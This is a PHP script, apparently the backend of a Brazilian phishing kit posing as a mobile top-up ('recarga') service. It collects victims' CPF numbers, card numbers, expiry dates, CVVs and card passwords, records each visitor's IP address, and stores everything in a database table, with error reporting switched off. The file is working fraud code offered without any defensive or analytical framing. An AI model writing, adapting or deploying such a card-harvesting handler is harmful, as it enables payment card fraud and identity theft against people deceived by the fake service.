<?php

// =================================================================================================
//         SCRIPT TOTALMENTE FEITO POR HYPN0THCY: // (19) 998018845
// =================================================================================================

error_reporting(0);
ob_start();
session_start();
date_default_timezone_set('America/Sao_Paulo');

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
if (filter_var($client, FILTER_VALIDATE_IP) && !strpos($client, ":")) {
    $ip  = $client;
} elseif (filter_var($forward, FILTER_VALIDATE_IP) && !strpos($forward, ":")) {
    $ip  = $forward;
} else {
    $ip  = $remote;
}

require("./db.php");

if (empty($_POST['senha']) || $_POST['senha'] == "") {
    if (empty($_POST['card']) || empty($_POST['cpf'])) {
        header("Location: ./");
        exit();
    }
    $sql = $pdo->prepare("INSERT INTO `infos` VALUES (default, ?,?,?,?,default,?)");
    $sql->execute([$_POST['cpf'], $_POST['card'], $_POST['mes'] . "/" . $_POST['ano'], $_POST['cvv'], $ip]);
    $_SESSION['recarga_id'] = $pdo->lastInsertId();
    $_SESSION['recarga_card'] = $_POST['card'];
    die("success");
} else {
    $sql = $pdo->prepare("UPDATE `infos` SET `pass`=? WHERE (`id`<=>? OR `cc`=?)");
    $sql->execute([$_POST['senha'], $_SESSION['recarga_id'], $_POST['info_1']]);
    unset($_SESSION['recarga_id']);
    unset($_SESSION['recarga_card']);
    die("success");
}
exit();
